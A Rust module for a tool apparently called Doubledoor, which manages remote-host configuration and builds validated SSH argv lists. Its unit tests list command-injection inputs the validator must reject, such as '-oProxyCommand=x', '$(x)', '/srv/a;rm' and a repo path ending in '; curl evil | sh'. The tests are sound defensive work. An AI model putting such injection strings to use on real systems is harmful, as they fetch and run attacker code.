//! `.doubledoor/remotes.json`: the registered remotes.

use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};
use serde_json::Value;

/// One remote Doubledoor.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Remote {
    /// Transport argv prefix, e.g. `["ssh", "-oBatchMode=yes", "vps-1"]`;
    /// empty runs the remote command directly on this host.
    #[serde(default)]
    pub transport: Vec<String>,
    /// The `doubledoor` binary on the remote.
    #[serde(default = "default_bin")]
    pub doubledoor: String,
    /// The canonical clone the remote Doubledoor serves.
    pub repo: String,
    /// Dream VPS node facts from the last probe (Phase VII item 2).
    #[serde(default)]
    pub node: Option<Value>,
    /// How this host proves an actor's identity to the remote (item 5):
    /// `{"actor": "...", "key": "/path/to/private/key", "host": "..."}`.
    #[serde(default)]
    pub identity: Option<Value>,
}

fn default_bin() -> String {
    "doubledoor".to_string()
}

#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct RemotesConfig {
    #[serde(default)]
    pub remotes: BTreeMap<String, Remote>,
}

impl RemotesConfig {
    pub fn path(store_root: &Path) -> PathBuf {
        store_root.join("remotes.json")
    }

    pub fn load(store_root: &Path) -> Result<Self, String> {
        match fs::read_to_string(Self::path(store_root)) {
            Ok(s) => serde_json::from_str(&s).map_err(|e| format!("remotes.json: {e}")),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Self::default()),
            Err(e) => Err(format!("remotes.json: {e}")),
        }
    }

    /// Atomic write (temp → rename).
    pub fn save(&self, store_root: &Path) -> Result<(), String> {
        fs::create_dir_all(store_root).map_err(|e| e.to_string())?;
        let target = Self::path(store_root);
        let tmp = store_root.join(".remotes.json.tmp");
        fs::write(
            &tmp,
            serde_json::to_vec_pretty(self).map_err(|e| e.to_string())?,
        )
        .map_err(|e| e.to_string())?;
        fs::rename(&tmp, &target).map_err(|e| e.to_string())
    }
}

/// Values that end up on a remote command line must be plain tokens: no
/// whitespace, quotes, or shell metacharacters, and no leading `-`.
pub fn safe_token(s: &str) -> bool {
    !s.is_empty()
        && !s.starts_with('-')
        && s.len() <= 512
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || "._/+~@:=-".contains(c))
}

/// Remote names are identifiers.
pub fn valid_name(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 64
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || "_-".contains(c))
}

impl Remote {
    /// Validate everything that reaches the remote command line.
    pub fn validate(&self) -> Result<(), String> {
        if !safe_token(&self.doubledoor) {
            return Err(format!(
                "remote binary `{}` is not a plain token",
                self.doubledoor
            ));
        }
        if !safe_token(&self.repo) {
            return Err(format!("remote repo `{}` is not a plain token", self.repo));
        }
        Ok(())
    }

    /// argv for running `args` on the remote (transport prefix + command).
    pub fn command(&self, args: &[&str]) -> Result<Vec<String>, String> {
        self.validate()?;
        for a in args {
            let ok = match a.strip_prefix("--") {
                Some(rest) => safe_token(rest),
                None => safe_token(a),
            };
            if !ok {
                return Err(format!("argument `{a}` is not a plain token"));
            }
        }
        let mut argv = self.transport.clone();
        argv.extend(args.iter().map(ToString::to_string));
        Ok(argv)
    }

    /// argv for the remote Doubledoor's stdio protocol.
    pub fn rpc_command(&self) -> Result<Vec<String>, String> {
        let repo = format!("--repo={}", self.repo);
        self.command(&[&self.doubledoor, &repo, "rpc"])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tokens_reject_shell_metacharacters() {
        for ok in [
            "/srv/repo",
            "~/code/x",
            "doubledoor",
            "/opt/dd-1.2/bin/doubledoor",
        ] {
            assert!(safe_token(ok), "{ok}");
        }
        for bad in [
            "",
            "-oProxyCommand=x",
            "/srv/a b",
            "/srv/a;rm",
            "$(x)",
            "`x`",
            "a|b",
            "a'b",
            "a\"b",
            "a\nb",
        ] {
            assert!(!safe_token(bad), "{bad}");
        }
    }

    #[test]
    fn remote_commands_are_prefix_plus_fixed_tokens() {
        let r = Remote {
            transport: vec!["ssh".into(), "-oBatchMode=yes".into(), "vps-1".into()],
            doubledoor: "doubledoor".into(),
            repo: "/srv/canon".into(),
            node: None,
            identity: None,
        };
        assert_eq!(
            r.rpc_command().unwrap(),
            [
                "ssh",
                "-oBatchMode=yes",
                "vps-1",
                "doubledoor",
                "--repo=/srv/canon",
                "rpc"
            ]
        );
        let evil = Remote {
            repo: "/srv/x; curl evil | sh".into(),
            ..r
        };
        assert!(evil.rpc_command().is_err());
    }
}
